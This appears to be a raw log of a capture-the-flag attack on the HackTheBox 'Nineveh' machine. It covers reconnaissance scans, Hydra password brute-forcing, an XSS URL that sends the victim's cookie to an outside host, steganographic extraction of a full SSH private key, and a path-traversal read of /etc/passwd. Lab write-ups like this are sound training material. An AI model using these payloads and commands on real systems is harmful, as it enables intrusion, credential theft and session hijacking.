++++++ NinevehV0.2 ++++++


root@7242-alpha-reticuli:~# netdiscover -i wlan0:0 -r 192.168.0.0/24 

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                
                                                                                                                                                                                              
 14 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 768                                                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.150   08:00:27:2e:f9:b5     10     600  PCS Systemtechnik GmbH                                                                                                                     
 192.168.1.68    dc:3a:5e:1f:85:bd      2      84  Roku, Inc.                                                                                                                                 
 192.168.1.69    b0:a7:37:91:c8:ad      2      84  Roku, Inc.                                                                                                                                 

root@7242-alpha-reticuli:~#

root@7242-alpha-reticuli:~# sudo nmap -A -p 80,443 192.168.0.150
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-23 13:27 CDT
Nmap scan report for nineveh.htb (192.168.0.150)
Host is up (0.00047s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
------ snip ------
|_  http/1.1
MAC Address: 08:00:27:2E:F9:B5 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms nineveh.htb (192.168.0.150)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
root@7242-alpha-reticuli:~# echo "192.168.0.150 nineveh.htb" >> /etc/hosts
root@7242-alpha-reticuli:~#

----------------------
ODD HTTP/1.1 OUTOUT --
----------------------


09:26:10-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ ./nikto.pl -h 192.168.0.150 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.150
+ Target Hostname:    192.168.0.150
+ Target Port:        80
+ Start Time:         2018-06-21 09:27:23 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xb2 0x5535e4e04002a 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 7519 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2018-06-21 09:27:31 (GMT-5) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.18) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n

09:27:33-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ ./nikto.pl -h 192.168.0.150 -ssl
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.150
+ Target Hostname:    192.168.0.150
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GR/ST=Athens/L=Athens/O=HackTheBox Ltd/OU=Support/CN=nineveh.htb/emailAddress=admin@nineveh.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=GR/ST=Athens/L=Athens/O=HackTheBox Ltd/OU=Support/CN=nineveh.htb/emailAddress=admin@nineveh.htb
+ Start Time:         2018-06-21 09:27:36 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x31 0x5535e4f1dfd20 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname '192.168.0.150' does not match certificate's names: nineveh.htb
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3092: /db/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7519 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2018-06-21 09:28:03 (GMT-5) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.18) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n

09:28:06-cdowns@7242-alpha-reticuli:~/Github/nikto/program$

LFI ?
root@7242-alpha-reticuli:~# searchsploit phpliteadmin
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                        |  Path
                                                                                                                                                      | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                        | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection                                                                                                                  | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                           | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                         | exploits/php/webapps/39714.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
root@7242-alpha-reticuli:~# 


Gather all Directories --

12:18:29-cdowns@7242-alpha-reticuli:~/Github/dirsearch$ ./dirsearch.py -u http://nineveh.htb -w /home/cdowns/.ZAP/fuzzers/dirbuster/directory-list-2.3-medium.txt -e php

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 220525

Error Log: /usr/local/secure/Github/dirsearch/logs/errors-18-06-23_12-24-21.log

Target: http://nineveh.htb

[12:24:21] Starting: 
[12:24:21] 200 -  178B  - /
[12:24:25] 301 -  315B  - /department  ->  http://nineveh.htb/department/
[12:26:46] 403 -  299B  - /server-status

Task Completed
12:29:54-cdowns@7242-alpha-reticuli:~/Github/dirsearch$ ./dirsearch.py -u https://nineveh.htb -w /home/cdowns/.ZAP/fuzzers/dirbuster/directory-list-2.3-medium.txt -e php

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 220525

Error Log: /usr/local/secure/Github/dirsearch/logs/errors-18-06-23_12-30-12.log

Target: https://nineveh.htb

[12:30:12] Starting: 
[12:30:12] 200 -   49B  - /
[12:30:13] 301 -  309B  - /db  ->  https://nineveh.htb/db/
[12:32:46] 403 -  300B  - /server-status
[12:32:46] 301 -  319B  - /secure_notes  ->  https://nineveh.htb/secure_notes/

Task Completed
12:36:01-cdowns@7242-alpha-reticuli:~/Github/dirsearch$ 

Hydra Time --

There is no username; just password and it's not using a phpsessid ?

17:38:19-cdowns@7242-alpha-reticuli:~$ hydra -vV -e ns -f -I -t 5 -w 5 -W 1 -l '' -P /home/cdowns/Github/SecLists/Passwords/darkc0de.txt 192.168.0.150 -S http-post-form "/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:S=200"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-21 17:38:46
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 1471058 login tries (l:1/p:1471058), ~294212 tries per task
[DATA] attacking http-post-forms://192.168.0.150:443//index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:S=200
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.0.150 - login "" - pass "" - 1 of 1471058 [child 0] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "|" - 3 of 1471058 [child 1] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "--" - 4 of 1471058 [child 2] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass ":-)" - 5 of 1471058 [child 3] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "??" - 6 of 1471058 [child 4] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "???" - 7 of 1471058 [child 1] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "/.," - 8 of 1471058 [child 0] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "0" - 9 of 1471058 [child 2] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "_0" - 10 of 1471058 [child 3] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "00" - 11 of 1471058 [child 4] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "000" - 12 of 1471058 [child 2] (0/0)
[ATTEMPT] target 192.168.0.150 - login "" - pass "0000" - 13 of 1471058 [child 0] (0/0)


phpLiteAdmin v1.9 --
http://phpliteadmin.googlecode.com/
root@7242-alpha-reticuli:~# searchsploit phpliteadmin
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                        |  Path
                                                                                                                                                      | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                        | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection                                                                                                                  | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                           | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                         | exploits/php/webapps/39714.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
root@7242-alpha-reticuli:~# 


root@7242-alpha-reticuli:~# cat /usr/share/exploitdb/exploits/php/webapps/38228.txt
source: http://www.securityfocus.com/bid/57431/info

phpLiteAdmin is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input before using it in an SQL query.
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
phpLiteAdmin 1.8.x and 1.9.x are vulnerable. 

http://www.example.com/phpliteadmin.php?action=row_view&table=' [ SQLi ]root@7242-alpha-reticuli:~# 
root@7242-alpha-reticuli:~# 


Trying to steal the admin cookie --

(hyp3rlinx)root@7242-alpha-rsearchsploit 37515
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                        |  Path
                                                                                                                                                      | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                           | exploits/php/webapps/37515.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
root@7242-alpha-reticuli:~# 
https://192.168.0.150/db/index.php%22'onMouseOver=%22(function()%7Bvar%20x='http';x+=String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+'192.168.1.116';window.open(x+String.fromCharCode(47)+'cookietheft.php'+String.fromCharCode(63)+'='+document.cookie);%7D)()%22

Re checking nikto --

+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3092: /db/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.

This should be vulnerable to cookie theft --


Checking image for Steganapgraphy --

root@7242-alpha-reticuli:/tmp# curl -o ninevehForAll.png https://192.168.0.150/ninevehForAll.png --insecure
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  547k  100  547k    0     0  35.6M      0 --:--:-- --:--:-- --:--:-- 35.6M
root@7242-alpha-reticuli:/tmp# zsteg ninevehForAll.png 
meta Software       .. text: "Shutter"
imagedata           .. file: amd 29k coff noprebar executable
b2,r,lsb,xy         .. file: 5View capture file
b2,r,msb,xy         .. file: VISX image file
b4,r,lsb,xy         .. file: 5View capture file
b4,r,msb,xy         .. file: VISX image file
b4,g,lsb,xy         .. text: "wwwwwwwwwwwww2z"
root@7242-alpha-reticuli:/tmp# curl -O https://nineveh.htb/secure_notes/nineveh.png --insecure
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2824k  100 2824k    0     0  1314k      0  0:00:02  0:00:02 --:--:-- 1314k
root@7242-alpha-reticuli:/tmp# zsteg nineveh.png 
[?] 10240 bytes of extra data after image end (IEND), offset = 0x2bf8d0
extradata:0         .. file: POSIX tar archive (GNU)
    00000000: 73 65 63 72 65 74 2f 00  00 00 00 00 00 00 00 00  |secret/.........|
    00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00000060: 00 00 00 00 30 30 30 30  37 35 35 00 30 30 30 30  |....0000755.0000|
    00000070: 30 34 31 00 30 30 30 30  30 34 31 00 30 30 30 30  |041.0000041.0000|
    00000080: 30 30 30 30 30 30 30 00  31 33 31 32 36 30 36 30  |0000000.13126060|
    00000090: 32 37 37 00 30 31 32 33  37 37 00 20 35 00 00 00  |277.012377. 5...|
    000000a0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00000100: 
meta Software       .. text: "Shutter"
imagedata           .. file: little endian ispell 3.0 hash file,
b1,b,msb,xy         .. text: "VE6=Z&kk!"
b1,bgr,msb,xy       .. text: "tlS5TeG2Z"
b2,rgb,lsb,xy       .. text: "!k#T\"ex%"
b4,b,lsb,xy         .. file: PGP\011Secret Key -
b4,bgr,lsb,xy       .. file: PGP\011Secret Sub-key -
root@7242-alpha-reticuli:/tmp# 

08:51:06-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ zsteg ninevehForAll.png b4,g,lsb,xy -b 8 -v
b4,g,lsb,xy         .. text: "wwwwwwwwwwwww2z"
    00000000: 77 77 77 77 77 77 77 77  77 77 77 77 77 32 7a ca  |wwwwwwwwwwwww2z.|
    00000010: 63 62 35 89 64 3b cc fe  21 5b e7 2e 06 98 77 77  |cb5.d;..![....ww|
    00000020: 77 77 77 77 77 77 77 77  77 77 77 77 77 60 51 79  |wwwwwwwwwwwww`Qy|
    00000030: 49 3f 88 e1 43 08 11 fe  dc bf fd bc cb db e7 f0  |I?..C...........|
    00000040: 97 14 04 32 67 66 77 77  77 77 77 77 77 ae ec 6f  |...2gfwwwwwww..o|
    00000050: e1 7d bb 54 0e 1e 16 cf  00 24 76 77 66 67 77 77  |.}.T.....$vwfgww|
    00000060: 77 77 77 77 77 77 77 77  77 77 77 77 77 77 77 77  |wwwwwwwwwwwwwwww|
    *
    00000090: 77 78 88 88 88 3b 9f 35  30 f2 6b de d9 77 77 77  |wx...;.50.k..www|
    000000a0: 77 77 77 77 77 77 77 77  77 77 77 77 77 77 77 77  |wwwwwwwwwwwwwwww|
    000000b0: 77 77 77 77 77 77 77 77  77 77 77 77 77 9c ca 87  |wwwwwwwwwwwww...|
    000000c0: 77 78 99 98 99 98 77 77  77 77 77 77 77 77 77 77  |wx....wwwwwwwwww|
    000000d0: 77 77 77 77 77 77 77 77  77 77 77 77 77 77 77 77  |wwwwwwwwwwwwwwww|
    *
    00000100: 
08:51:52-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ 


Let's see if we can EXTRACT THIS DATA 
-- nineveh.png --

root@7242-alpha-reticuli:/tmp/secret# echo $(( 16#2bf8d0 ))
2881744
root@7242-alpha-reticuli:/tmp/secret# dd if=nineveh.png bs=1 skip=2881744 of=nineveh.tar
10240+0 records in
10240+0 records out
10240 bytes (10 kB, 10 KiB) copied, 0.0424313 s, 241 kB/s
root@7242-alpha-reticuli:/tmp# tar -xvf nineveh.tar 
secret/
secret/nineveh.priv
secret/nineveh.pub
root@7242-alpha-reticuli:/tmp# cd secret/
root@7242-alpha-reticuli:/tmp/secret# ls
nineveh.priv  nineveh.pub
root@7242-alpha-reticuli:/tmp/secret#

root@7242-alpha-reticuli:/tmp/secret# cat nineveh.pub ; cat nineveh.priv 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
root@7242-alpha-reticuli:/tmp/secret# /usr/sbin/ssh2john nineveh.priv > nineveh.priv.hash
nineveh.priv has no password!
root@7242-alpha-reticuli:/tmp/secret#


11:31:27-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cewl -d 1 -m 7 -w ninevehForAll.lst https://en.wikipedia.org/wiki/Nineveh
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
11:33:00-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cat ninevehForAll.lst | wc -l
5920
11:33:15-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ 


Login --
https://nineveh.htb/db/

root@7242-alpha-reticuli:~# hydra -vV -f -l user -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&proc_login=true:Incorrect password" -I
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-23 17:05:54
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344429 login tries (l:1/p:14344429), ~896527 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443//db/index.php:password=^PASS^&proc_login=true:Incorrect password
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target nineveh.htb - login "user" - pass "WordPress" - 1 of 14344429 [child 0] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "content" - 2 of 14344429 [child 1] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "Comments" - 3 of 14344429 [child 2] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "another" - 4 of 14344429 [child 3] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "branding" - 5 of 14344429 [child 4] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "Passione" - 6 of 14344429 [child 5] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "Syndication" - 7 of 14344429 [child 6] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "masthead" - 8 of 14344429 [child 7] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "everyone" - 9 of 14344429 [child 8] (0/0)
----- snip ------
[ATTEMPT] target nineveh.htb - login "user" - pass "mookie" - 1430 of 14344429 [child 2] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "fresita" - 1431 of 14344429 [child 4] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "leelee" - 1432 of 14344429 [child 6] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "tequieromucho" - 1433 of 14344429 [child 8] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "harry" - 1434 of 14344429 [child 9] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "giovanni" - 1435 of 14344429 [child 12] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "ranger" - 1436 of 14344429 [child 15] (0/0)
[ATTEMPT] target nineveh.htb - login "user" - pass "celticfc" - 1437 of 14344429 [child 14] (0/0)
[443][http-post-form] host: nineveh.htb   login: user   password: password123
[STATUS] attack finished for nineveh.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-23 17:10:30
root@7242-alpha-reticuli:~# 


Login --
http://nineveh.htb/department/login.php

root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# hydra -vV -e ns -f -I -t 16 -w 5 -W 1 -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-23 16:51:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344431 login tries (l:1/p:14344431), ~896527 tries per task
[DATA] attacking http-post-form://nineveh.htb:80//department/login.php:username=^USER^&password=^PASS^:Invalid Password!
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target nineveh.htb - login "admin" - pass "admin" - 1 of 14344431 [child 0] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "" - 2 of 14344431 [child 1] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "WordPress" - 3 of 14344431 [child 2] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "content" - 4 of 14344431 [child 3] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "Comments" - 5 of 14344431 [child 4] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "another" - 6 of 14344431 [child 5] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "branding" - 7 of 14344431 [child 6] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "Passione" - 8 of 14344431 [child 7] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "Syndication" - 9 of 14344431 [child 8] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "masthead" - 10 of 14344431 [child 9] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "everyone" - 11 of 14344431 [child 10] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "enjoyed" - 12 of 14344431 [child 11] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "apprezzato" - 13 of 14344431 [child 12] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "programma" - 14 of 14344431 [child 13] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "Welcome" - 15 of 14344431 [child 14] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "writing" - 16 of 14344431 [child 15] (0/0)
----- snip ------
[VERBOSE] Page redirected to http://nineveh.htb/department/manage.php
[ATTEMPT] target nineveh.htb - login "admin" - pass "lissette" - 4602 of 14344431 [child 13] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "jamila" - 4603 of 14344431 [child 11] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "hotmail1" - 4604 of 14344431 [child 12] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "hoover" - 4605 of 14344431 [child 15] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "guinness" - 4606 of 14344431 [child 14] (0/0)
[ATTEMPT] target nineveh.htb - login "admin" - pass "gerson" - 4607 of 14344431 [child 10] (0/0)
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
[STATUS] attack finished for nineveh.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-23 17:04:08
root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# 


Goto --
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt

Nice !! --
Have you fixed the login page yet! hardcoded username and password is really bad idea!
check your serect folder to get in! figure it out! this is your challenge
Improve the db interface.
~amrois

We have this guys KEYS too... Let's try LFI to get a shell --

Note:
https://github.com/P0cL4bs/Kadimus

http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
Shortened --

http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
